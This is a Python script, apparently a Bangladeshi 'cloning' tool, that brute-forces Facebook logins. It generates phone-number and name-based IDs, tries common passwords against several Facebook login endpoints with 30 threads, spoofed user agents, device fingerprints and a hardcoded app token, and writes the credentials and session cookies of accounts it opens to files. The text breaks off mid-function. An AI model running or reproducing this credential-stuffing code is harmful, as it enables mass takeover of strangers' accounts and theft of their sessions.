import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def clear():
    os.system('clear')

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python ALINUR.py')
#------------------[ ALINUR-USERAGENT ]-------------------#
except:pass
ugen = []

####@-----UserAgent----@####
"""

Mozilla/5.0 (Windows NT 9.2; Win64; x64; rv:43.43.2) Gecko/20100101 Firefox/43.43.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:62.0) Gecko/20100101 Firefox/49.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/58.0.1
Mozilla/5.0 (X11; Ubuntu i686; rv:52.0) Gecko/20100101 Firefox/52.0
Mozilla/5.0 (Linux; Android 10; Mi A2 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]
Mozilla/5.0 (Linux; Android 10; Mi A2 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;]
Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/397.0.0.20.81;]
Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:84.0) Gecko/20100101 Firefox/84.0
Mozilla/5.0 (Linux; Android 13; RMX3393 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]	
Mozilla/5.0 (Linux; Android 13; RMX3393 Build/TP1A.220905.001; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.0.0 Mobile Safari/537.36 BingSapphire/25.9.410714302
Mozilla/5.0 (Linux; Android 11; RMP2102 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]
Mozilla/5.0 (Linux; Android 12; RMP2107 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]
Mozilla/5.0 (Linux; Android 12; RMX2075 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2 (KHTML, like Gecko) Web Browser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/99.9 Chrome/96.0.4664.104 Safari/537.36
Mozilla/5.0 (Linux; Android 13; CPH2449) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36    
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9506/I9506XXSDPL2) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S911U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36
Mozilla/5.0 (Linux; Tizen 6.0; SAMSUNG Family Hub 8.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.0 Chrome/76.0.3809.146 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 TV Safari/538.1
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G901F/G901FXXU1CPHA Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 5.0; Windows NT 5.1; Windows NT 6.0; Windows NT 6.1; Linux; es-VE; rv:52.9.0) Gecko/20100101 Firefox/52.9.0
Mozilla/5.0 (Linux; Android 7.1.1; ASUS_X00HD Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/175.0.0.23.81;]

"""    

for ua in range(10000):
    a='Mozilla/5.0 (Windows; U; Windows NT'
    b=random.choice(['4.1.2','6','7','8','9','10','11','12','13'])
    c='en-US; rv'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(62,199)
    h='Firefox/70'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for user in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(73,100)
	h='Mobile Safari/537.36'
	user=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(user)
#Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]
for user in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(73,100)
	h='Mobile Safari/537.36'
	user=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(user)   
for user in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14'])
	c='SAMSUNG SM-T550 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(4000,6000)
	g=random.randrange(73,100)
	h='Mobile Safari/537.36'
	user=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(user)   
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['4.1.2','6','7','8','9','10','11','12','13'])
    c='zh-cn; GT-S7562C Build/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(62,199)
    h='Mobile Safari/534.24'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(62,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)   
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=random.choice(['SM-S906B, SM-S906B/DS, SM-S906U, SM-S906U1, SM-S906W, SM-S906N, SM-S9060, SM-S906E, SM-S906E/DS'])
    d=') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    e=random.randrange(92,115)
    x='0'
    f=random.randrange(4200,6000)
    g=random.randrange(62,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}{e}.{x}.{f}.{g} {h}'
    ugen.append(lol)
#------------------[ ALINUR-UNKNOWN ]-------------------#
sim_id = ''
android_version = subprocess.check_output(
    'getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output(
    'getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output(
    'getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
        'utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Zong'
fbmf = subprocess.check_output(
    'getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output(
    'getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode(
    'utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace(
    '\n', '')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
try:
    fbcr = subprocess.check_output(
        'getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
            'utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    elif select == '2':
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
                'utf-8').split(',')[1].replace('\n', '')
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = 'Zong'
        sim_id += fbcr
except:
    fbcr = "Zong"
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm}

#------------------[ ALINUR-LOGO ]-------------------#
os.system('xdg-open https://www.facebook.com/groups/2614369305369573/?ref=share')
logo = """

 \033[1;93m..####...##......######..##..##..##..##..#####..
 \033[1;92m.##..##..##........##....###.##..##..##..##..##.
 \033[1;97m.######..##........##....##.###..##..##..#####..
 \033[1;96m.##..##..##........##....##..##..##..##..##..##.
 \033[1;95m.##..##..######..######..##..##...####...##..##.                                                 
 \033[1;92m=================\033[1;93m==============\033[1;92m==================
 \033[1;92m=     \033[1;32m[=] CREATED BY\33[0;92m   :  \033[1;32mALINUR RAHMAN         \033[1;92m=
 \033[1;97m=     \033[1;97m[=] FACEBOK      : \033[1;97m ALINUR RAHMAN         \033[1;97m=
 \033[1;92m=     \033[1;32m[=] GITHUB       :  \033[1;32mCYBER_TECH9           \033[1;92m=
 \033[1;95m=     \033[1;95m[=] TOOL STATUS  : \033[1;35m Random Cloning Bd     \033[1;95m=
 \033[1;96m=     \033[1;96m[=] TEAM         :  \033[1;36mAHT                   \033[1;96m=
 \033[1;92m=     \033[1;93m[=] TOOL VIRSION :  \033[1;33m0.0                   \033[1;93m=
 \033[1;92m=================\033[1;93m==============\033[1;92m==================\033[1;92m"""

def linex():
    print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')

def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []

#------------------[ ALINUR-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
            print(' \033[1;32m[01] FILE CLONING\n\033[1;35m [02] RANDOM CLONING [WORKING]\n\033[1;30m [03] VISIT MY ACCOUNT\n\033[1;31m [04] CLOSE TOOL')
            print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
            xd = input('\033[1;33m[🖋️] CHOOSE : ')
            if xd in ['1', '01']:
                clear()
                print(' \033[1;32m[PUT FILE EXAMPLE:  /sdcard/ALINUR.txt  Etc...]')
                print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
                file = input(' \033[1;33m[🗂️] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [BEST WORKING]\n[2] METHOD 2')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first1122')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first12')
                    plist.append('first111')
                    plist.append('first11')
                    plist.append('i love you')
                    plist.append('last')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
                    print(' \033[1;92m=\033[1;92m   ❥︎ YOUR TOTAL IDS: '+tl)
                    print(' \033[1;91m=\033[1;91m   ❥︎ WITH AND SEE FOR OK ID')
                    print(' \033[1;93m=\033[1;93m   ❥︎ Use Flight Mode For Speed Up')
                    print(' \033[1;95m=\033[1;95m   ❥︎ Fast Speed Cloning')
                    print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                print('\033[1;37m')
                linex()
                print('[😘]CRACKING HAS COMPLETED')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python ALINUR.py')
            elif xd in ['3', '03']:
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1] Bangladesh cloning \n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    bd()
                if xd in ['0', '00']:
                    menu()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python ALINUR.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()

def bd():
    user = []
    clear()
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(" BD SIM 017, 018, 019, 014, 013, 015")
    print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
    kode = input(' [📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    limit = int(input(' [?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
        print(' \033[1;92m=\033[1;92m   ❥︎ YOUR TOTAL IDS: '+tl)
        print(' \033[1;91m=\033[1;91m   ❥︎ WITH AND SEE FOR OK ID')
        print(' \033[1;93m=\033[1;93m   ❥︎ Use Flight Mode For Speed Up')
        print(' \033[1;95m=\033[1;95m   ❥︎ Fast Speed Cloning')
        print(' \033[1;92m=================\033[1;93m==============\033[1;92m==================')
        for guru in user:
            uid = kode + kodex + kod + guru
            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, kod + kodex + kode, kode + kodex, kodex + kod, kodex + kod + guru, kode + guru, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'freefire', 'shahin', 'sumaiya']
            yaari.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\33[1;94m[\033[1;30mALINUR\33[1;94m][\033[1;33m%s\33[1;94m/\033[1;33m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'method': 'POST',
    'accept': '*/*',
    'scheme': 'https',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryPBurW8ZqPKJ4Abp4',
    # 'cookie': 'datr=fk7JZBo54TbWwovnI2_eVXjx; sb=fk7JZNT0ojXcBH5Sge7DfRQ4; m_pixel_ratio=2; fr=0EQYguRGEnmGa3tpz..BkyU5-.-g.AAA.0.0.BkyaVU.AWVtg3i1Fsw; wd=980x1824',
    'origin': 'https://p.facebook.com',
    'referer': 'https://p.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'viewport-width': '980',
    'x-asbd-id': '129477',
    'x-fb-lsd': 'AVrtPozlvKc',
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',
    'x_fb_background_state': '1',   
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi A2 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]',}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[ALINUR-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/RANDOM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[lol-CP💔] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/RANDOM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:pass

def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;37m[ALINUR] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1), "uid": ids, "next": "https://p.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas,}
            complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[ALINUR-OK💚] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " ALINUR, ok, id"')
                open('/sdcard/ALINUR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[ALINUR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/ALINUR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global oks, loop, sim_id, device
        sys.stdout.write(
            '\r\r\033[1;37m[ALINUR] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]

        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                "sim_country": "id",
                'try_num': '1',
                'family_device_id': family,
                'sim_serials': sim_serials,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'reg_instance': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'locale': fblc,
                'client_country_code': '',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)),
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; OnePlus 6T Build/TP1A.219844.050) [FBAN/FB4A;FBAV/357.0.0.12.48;FBBV/236971542;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBMF/OnePlus 6T;FBBD/OnePlus 6T;FBDV/OnePlus 6T;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[ALINUR-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " ALINUR, ok, id"')
                open('/sdcard/ALINUR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[ALINUR-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[ALINUR-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/ALINUR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/ALINUR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def api1(ids, names, passlist):
    try:
        global oks, loop, sim_id
        sys.stdout.write(
            '\r\r\033[1;37m[ALINUR-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
